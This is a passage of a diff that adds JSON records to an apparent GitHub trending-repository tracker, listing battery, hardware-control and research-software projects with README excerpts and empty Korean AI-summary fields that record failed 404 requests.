+   "pushed_at": "2026-11-20T07:54:47Z",
+   "matched_queries": [
+    "topic:battery"
+   ],
+   "stars_delta": 4,
+   "rank": 16,
+   "readme_excerpt": "Lenovo Legion Linux Support\n\n# Other language versions of this README file:\n\nThis project is not affiliated with Lenovo in any way\n\nLenovo Legion Linux (LLL) brings additional drivers and tools for Lenovo Legion series laptops to Linux. It is the alternative to Lenovo Vantage or Legion Zone (both Windows only).\n\nIt allows you to control features like the fan curve, power mode, power limits, rapid charging, and more. This has been achieved through reverse engineering and disassembling the ACPI firmware, as well as the firmware and memory of the embedded controller (EC).\n\n:star: Please star this repository if this is useful or might be useful in the future.\n\n:star2: My goal is to merge the driver into the main Linux kernel so it comes automatically with Linux and no recompilation is required after a Linux update\n\n:boom: Starring shows that this is useful to me and the Linux community so hopefully a merge into the Kernel is possible.",
+   "readme_chars": 11375,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 1,
+   "is_new": false
+  },
+  {
+   "full_name": "Sapd/HeadsetControl",
+   "url": "https://github.com/Sapd/HeadsetControl",
+   "description": "Sidetone and Battery status for Logitech G930, G533, G633, G933 SteelSeries Arctis 7/PRO 2019 and Corsair VOID (Pro) in Linux and MacOSX",
+   "language": "C++",
+   "stars": 1975,
+   "forks": 266,
+   "topics": [
+    "battery",
+    "corsair",
+    "corsair-void",
+    "headsets",
+    "hid",
+    "hidapi",
+    "linux",
+    "logitech",
+    "osx",
+    "sidetone",
+    "usb"
+   ],
+   "pushed_at": "2026-11-18T17:19:30Z",
+   "matched_queries": [
+    "topic:battery",
+    "battery in:name,description"
+   ],
+   "stars_delta": 4,
+   "rank": 17,
+   "readme_excerpt": "# HeadsetControl\n\nA cross-platform tool to control USB gaming headsets on Linux, macOS, and Windows. Manage sidetone, battery status, LED lights, equalizers, and more.\n\n# Features\n\n• Sidetone - Hear your own voice without latency (unlike software loopback)\n\n• Battery Status - Monitor charge level, voltage, and time remaining\n\n• LED Control - Toggle lights on/off and set their color\n\n• Equalizer - Presets and custom EQ curves (including parametric EQ)\n\n• Inactive Time - Auto power-off timer\n\n• Chat-Mix - Game/chat audio balance\n\n• Microphone - Volume, mute LED brightness, rotate-to-mute\n\n• Voice Prompts - Enable/disable audio cues\n\n• Bluetooth - Power-on behavior, call volume\n\nCheck the Supported Devices table below to confirm your headset is covered.",
+   "readme_chars": 17931,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 2,
+   "is_new": false
+  },
+  {
+   "full_name": "hang-jin/editaplot",
+   "url": "https://github.com/hang-jin/editaplot",
+   "description": "AI-guided editable scientific figures with Codex and local Origin/OriginPro",
+   "language": "Python",
+   "stars": 1196,
+   "forks": 40,
+   "topics": [
+    "codex-skill",
+    "editable-figures",
+    "research",
+    "scientific-visualization",
+    "windows",
+    "xps",
+    "xrd"
+   ],
+   "pushed_at": "2026-11-22T08:01:35Z",
+   "matched_queries": [
+    "topic:xrd"
+   ],
+   "stars_delta": 4,
+   "rank": 18,
+   "readme_excerpt": "把表格交给 Codex，把可编辑的科研图带回 Origin 理解数据 · 选择表达 · 定制样式 · 检查交付 三步开始 · 看图选模板 · 复制提示词 · 完整教程 · English\n\n我做 EditaPlot，是想少花一些时间反复调图，多留一些时间讨论数据本身。你把表格和想表达的问题告诉 Codex，它会先说明每列的用途，等你确认后，再调用本机 Origin 绘图和检查结果。\n\n它是一个 Codex Skill，不是独立绘图软件。你仍然可以在 Origin 中继续编辑曲线、坐标轴和图例；配色、线宽与版式也可以在已支持的范围内按你的需求调整。\n\n使用前提：Windows 10/11 x64 实体电脑 + Codex + 本机 Origin/OriginPro。 日常使用不需要提前打开 Origin；Mac、Linux、WSL 和虚拟机暂不支持。\n\n# 先看看能画什么\n\n按实际列展示背景、包络和组分，不补造缺失峰。 同时看组间分布和每个观测，而不只看一根柱子。 使用上游已提供的逐样本 SHAP；绘图层不训练模型。 保留全部 900 个源值与行列顺序，不插值、不自动聚类。\n\n这些示例都用合成教学数据，由真实 Origin 生成，不代表实验或临床结论。点击图片可以看原图。\n\n浏览全部 45 条绘图路线 → 荧光 / EEG 研究信号 English gallery\n\n# 开始使用\n\n# 1 / 安装：这段话交给 Codex\n\n不会 GitHub 也没关系，把下面这段话复制给 Codex：\n\n请下载并保留完整仓库（包括 runtime），运行根目录 editaplot.cmd setup 和 doctor。 优先复用已有的 64 位 Python 3.11/3.12；需要安装 Python 时先问我。 不要安装或修改 Origin，不要修改注册表、DCOM，也不要申请管理员权限或控制鼠标。 完成后用中文告诉我环境是否就绪，再让我提供数据。\n\n也可以下载完整 ZIP，完整解压后让 Codex 在该文件夹里安装。不要只复制 skill/editaplot 子目录，它需要仓库中的绘图引擎。\n\n首次运行缺少兼容 Python 时，先按安装指南完成确认与配置。项目依赖只进入本项目环境，不修改全局 Python。",
+   "readme_chars": 6769,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "README가 중국어 위주",
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 5,
+   "is_new": false
+  },
+  {
+   "full_name": "ResistanceTo/MiniWatts",
+   "url": "https://github.com/ResistanceTo/MiniWatts",
+   "description": "An iPhone battery, charging and thermal instrument built on private iOS APIs — real charger watts, what actually reaches the cell, all 30 temperature sensors, and the USB-PD handshake.",
+   "language": "Swift",
+   "stars": 545,
+   "forks": 34,
+   "topics": [
+    "battery",
+    "battery-monitor",
+    "charging",
+    "ios",
+    "ios-app",
+    "iphone",
+    "iphone-app",
+    "private-api",
+    "reverse-engineering",
+    "swift",
+    "swiftui",
+    "swiftui-app"
+   ],
+   "pushed_at": "2026-11-07T08:06:53Z",
+   "matched_queries": [
+    "topic:battery",
+    "battery in:name,description"
+   ],
+   "stars_delta": 4,
+   "rank": 19,
+   "readme_excerpt": "# MiniWatts\n\nAn iPhone and iPad battery and charging monitor built on Apple's private APIs. It reads the device's own power-management sensors — the ones iOS uses to run the charge — and shows what the charger is delivering, how much of it reaches the cell, where the rest goes as heat, and what every temperature sensor in the device is doing while it happens.\n\n> Sideload only. Private APIs mean this can never be on the App Store — you sign > and install it yourself. There is no network code of any kind: nothing it reads > leaves your phone.\n\n# Install\n\nDownload the latest MiniWatts-unsigned.ipa from Releases and sign it with your own Apple ID — Sideloadly, AltStore, SideStore and Xcode all do this. A free Apple ID works; the app then expires after seven days and you re-sign it.\n\nRequires iPhone or iPad, iOS 17 or later.\n\nOr add the source to SideStore or AltStore — including the SideStore bundled with LiveContainer — and install from there, so new versions show up as updates:",
+   "readme_chars": 4676,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 3,
+   "is_new": false
+  },
+  {
+   "full_name": "dalathegreat/Battery-Emulator",
+   "url": "https://github.com/dalathegreat/Battery-Emulator",
+   "description": "This revolutionary software enables EV battery packs to be easily reused for stationary storage in combination with solar inverters",
+   "language": "C++",
+   "stars": 3045,
+   "forks": 432,
+   "topics": [],
+   "pushed_at": "2026-11-22T09:32:25Z",
+   "matched_queries": [
+    "battery in:name,description"
+   ],
+   "stars_delta": 3,
+   "rank": 20,
+   "readme_excerpt": "# Battery-Emulator ⚡🔋\n\n# What is Battery Emulator?\n\nMany manufacturers sell home battery systems to enable homeowners to store power collected from the grid, or renewable sources, to use at times when electricity demand is higher. However almost all of these home battery systems charge a high cost for every kilowatt hour (kWh) of capacity you buy.\n\nAt the same time, EV manufacturers have been putting high capacity battery packs into their cars, with no firm plan for what should happen to those batteries if the car is damaged in a crash, or reaches the end of its life as a vehicle.\n\nBattery Emulator enables EV battery packs to be repurposed for stationary storage. It acts as a translation layer between the EV battery and the home inverter. This makes it extremely cheap and easy to use large EV batteries in a true plug'n'play fashion!",
+   "readme_chars": 4888,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 3,
+   "is_new": false
+  },
+  {
+   "full_name": "agmmnn/tauri-ui",
+   "url": "https://github.com/agmmnn/tauri-ui",
+   "description": "🦀 Tauri + shadcn/ui desktop app scaffolder with desktop-ready defaults and optional batteries. Supports: Vite, Next.js, Astro, TanStack Start.",
+   "language": "TypeScript",
+   "stars": 2349,
+   "forks": 138,
+   "topics": [
+    "base-ui",
+    "boilerplate",
+    "desktop-app",
+    "nextjs",
+    "radix-ui",
+    "scaffold",
+    "shadcn",
+    "shadcn-ui",
+    "tauri",
+    "tauri-app"
+   ],
+   "pushed_at": "2026-11-22T20:27:14Z",
+   "matched_queries": [
+    "battery in:name,description"
+   ],
+   "stars_delta": 3,
+   "rank": 21,
+   "readme_excerpt": "# tauri-ui\n\n> ⚡ Scaffold Tauri desktop apps with shadcn/ui and desktop-ready defaults.\n\nChoose Vite, Next.js, React Router, Astro, or TanStack Start. Upstream CLIs build the foundation; tauri-ui adds the native shell and optional batteries.\n\n# Get started\n\n> Each release includes a demo build showing the expected output — available in Releases.\n\n# After scaffold\n\n• swap icons: bunx tauri icon ./app-icon.png\n\n• add shadcn components: bunx shadcn@latest add dialog sonner\n\n• add tauri plugins: bun run tauri add store (plugin list)\n\n• batteries live in src/components/ (debug-panel, external-link-guard, theme-provider)\n\n• tweak window defaults in src-tauri/tauri.conf.json\n\n• CLI flags + opt-outs → packages/create-tauri-ui\n\n# 🔋 Batteries Included\n\n• no startup flash (hidden until first paint)\n\n• external links open in system browser\n\n• no overscroll / rubber-band scrolling\n\n• sensible default window size and position\n\n• smaller binary output (~65% smaller binary in our test)",
+   "readme_chars": 3804,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 1,
+   "is_new": false
+  },
+  {
+   "full_name": "pybamm-team/PyBaMM",
+   "url": "https://github.com/pybamm-team/PyBaMM",
+   "description": "Fast and flexible physics-based battery models in Python",
+   "language": "Python",
+   "stars": 1741,
+   "forks": 847,
+   "topics": [
+    "batteries",
+    "battery-models",
+    "hacktoberfest",
+    "pybamm",
+    "python",
+    "simulation",
+    "solvers"
+   ],
+   "pushed_at": "2026-11-22T16:33:53Z",
+   "matched_queries": [
+    "battery in:name,description"
+   ],
+   "stars_delta": 3,
+   "rank": 22,
+   "readme_excerpt": "# PyBaMM\n\nPyBaMM (Python Battery Mathematical Modelling) is an open-source battery simulation package written in Python. Our mission is to accelerate battery modelling research by providing open-source tools for multi-institutional, interdisciplinary collaboration. Broadly, PyBaMM consists of (i) a framework for writing and solving systems (ii) a library of battery models and parameters, and (iii) specialized tools for simulating battery-specific experiments and visualizing the results. Together, these enable flexible model definitions and fast battery simulations, allowing users to explore the effect of different battery designs and modeling assumptions under a variety of operating scenarios.\n\nPyBaMM uses an open governance model and is fiscally sponsored by NumFOCUS. Consider making a tax-deductible donation to help the project pay for developer time, professional services, travel, workshops, and a variety of other needs.",
+   "readme_chars": 8056,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 1,
+   "is_new": false
+  },
+  {
+   "full_name": "mohammadrezwankhan/matlab-simulink-energy-lab",
+   "url": "https://github.com/mohammadrezwankhan/matlab-simulink-energy-lab",
+   "description": "Run reduced-order battery, thermal, converter and BESS control models with transparent equations and repeatable testing.",
+   "language": "MATLAB",
+   "stars": 354,
+   "forks": 22,
+   "topics": [
+    "battery-modeling",
+    "battery-thermal-management",
+    "bess",
+    "control-systems",
+    "dc-dc-converter",
+    "engineering-education",
+    "extended-kalman-filter",
+    "grid-following",
+    "grid-forming",
+    "interactive-dashboard",
+    "matlab",
+    "model-based-design",
+    "power-electronics",
+    "simulation",
+    "simulink",
+    "state-of-charge"
+   ],
+   "pushed_at": "2026-11-23T02:05:30Z",
+   "matched_queries": [
+    "battery in:name,description"
+   ],
+   "stars_delta": 3,
+   "rank": 23,
+   "readme_excerpt": "Explore battery, thermal, converter, and BESS control models in Base MATLAB and Simulink, with runnable examples and inspectable assumptions.\n\nMATLAB quickstart · Model catalog · Example source · Evidence · Limits\n\n> Version 1.12.1 — 2026-11-22. Release archives, verification evidence, > and SHA-256 checksums are available on the releases page. > See release readiness and migration and the > commit-bound engineering evidence ledger for > the exact gates and the distinction between current source and historical CI.\n\nThe native repository contains Base MATLAB and generated Simulink models for batteries, thermal response, converters, and BESS control. A second-order response exercise develops control intuition before the bounded native examples.\n\nNative-source lesson guide · Offline interactive lab · Lesson configuration · Configuration schema\n\n# One-command MATLAB quickstart\n\nFrom the cloned repository root, with MATLAB installed:",
+   "readme_chars": 41898,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 1,
+   "is_new": false
+  },
+  {
+   "full_name": "DingyangLyu/MatOS",
+   "url": "https://github.com/DingyangLyu/MatOS",
+   "description": "MatOS: an agent operating system for materials research, with a layered scientific asset graph, stateful adaptive workflows and evidence-driven asset evolution.",
+   "language": "TypeScript",
+   "stars": 38,
+   "forks": 4,
+   "topics": [
+    "ai",
+    "ai-agents",
+    "ai4materials",
+    "materials-science"
+   ],
+   "pushed_at": "2026-10-25T10:43:07Z",
+   "matched_queries": [
+    "topic:materials-science"
+   ],
+   "stars_delta": 3,
+   "rank": 24,
+   "readme_excerpt": "Describe a materials research task. MatOS assembles the scientific assets it needs, runs them as a stateful, checkable workflow, and turns every run into better assets for the next one.\n\n# Contents\n\n• What's in This Edition\n\n# What is MatOS?\n\nMatOS is an agent operating system for materials research. Materials studies run for days, cross literature, computation and experiment, and keep changing as results arrive. Agents for this work have to take on new data and software, keep long tasks on track, and remember what earlier tasks taught them. MatOS builds these capabilities around versioned scientific assets: data, knowledge, tools, skills, roles and workflows.\n\nResearch tasks drive the stateful adaptive workflow, the layered scientific asset graph supplies composable capabilities, and execution traces and user feedback become reviewed asset revisions that return to the graph.",
+   "readme_chars": 28744,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 2,
+   "is_new": false
+  },
+  {
+   "full_name": "AstriaFR/ACol-Battery",
+   "url": "https://github.com/AstriaFR/ACol-Battery",
+   "description": "面向已 root 的 Android 设备的电池与性能监测工具，支持充放电记录、耗电与使用时间分析、电池健康趋势、游戏性能统计和悬浮监视，并为兼容的 OPLUS 设备提供进阶电池与充电设置。",
+   "language": "Java",
+   "stars": 37,
+   "forks": 4,
+   "topics": [
+    "android",
+    "battery",
+    "battery-monitor",
+    "coloros",
+    "kernelsu",
+    "performance-monitoring",
+    "realme-ui",
+    "root"
+   ],
+   "pushed_at": "2026-11-16T23:43:03Z",
+   "matched_queries": [
+    "topic:battery"
+   ],
+   "stars_delta": 3,
+   "rank": 25,
+   "readme_excerpt": "# ACol 电池\n\n面向已 root 的 Android 设备的电池与性能监测工具，支持充放电记录、耗电与使用时间分析、电池健康趋势、游戏性能统计和悬浮监视，并为兼容的 OPLUS 设备提供进阶电池与充电设置。\n\n# 安装与使用\n\n应用需要 Android 13 或以上、ARM64 架构，以及可授予应用 root 权限的环境。基本充放电记录可使用兼容的电池接口。详细电池信息和进阶设置依赖设备提供相应的 OPLUS 厂商节点。\n\n安装 APK 后，首次打开时授予 root 权限。应用会检查设备提供的接口，并准备后台记录。部分功能受限时，可按提示继续使用。若提示记录所需的电池读数暂不可用，可先进入应用，稍后在「设置」中开启记录并重试。若初始化失败，可在错误报告中查看原因。\n\n记录开启后，可在「首页」查看实时状态，在「记录」回看充放电曲线和耗电统计，并在「设置」调整采样间隔。关闭应用界面后，后台仍会继续记录。\n\n# 主要功能\n\n• 实时电池状态。首页显示当前电量、剩余容量、电流、电压、温度和功耗。\n\n• 充放电记录。自动划分充电与放电记录，支持按类型和年月筛选。详情页支持曲线缩放和 CSV 导出。可开启「通知栏显示」查看充放电摘要。\n\n• 耗电分析与续航估算。查看亮屏和息屏耗电、分时耗电及应用耗电分布。根据当前电池状态和记录中的使用强度估算剩余能量及可用亮屏时长。\n\n• 使用时间统计。从首页进入日、周、月视图，查看使用时长和应用分布。统计独立于充放电记录，支持删除已结束的整天或整周。\n\n• 游戏性能统计。记录游戏期间的功耗、帧率、最低帧率、CPU/GPU 指标和内存用量。可自定义功耗与性能曲线的采样项目，并与普通记录同时运行。\n\n• 性能监视器。在屏幕顶部显示帧率、CPU、GPU、瞬时功耗、电池电量和温度。可自定义显示项目、大小、颜色阈值、文字颜色、背景不透明度和横屏位置，在设置和控制中心均可独立开关。\n\n• 电池信息与健康趋势。查看电池容量、健康度和循环次数。支持自动或手动保存电池快照、查看历史趋势。\n\n• 进阶设置。在兼容的 OPLUS 设备上查看生效值，调整截止与关机电压、浮充、降温档位、电流计采样间隔和充电电流。支持暂停、禁止和旁路充电，可查看参数说明与详细档位，也可恢复厂商设置。",
+   "readme_chars": 1426,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "README가 중국어 위주",
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 1,
+   "is_new": false
+  }
+ ]
+}
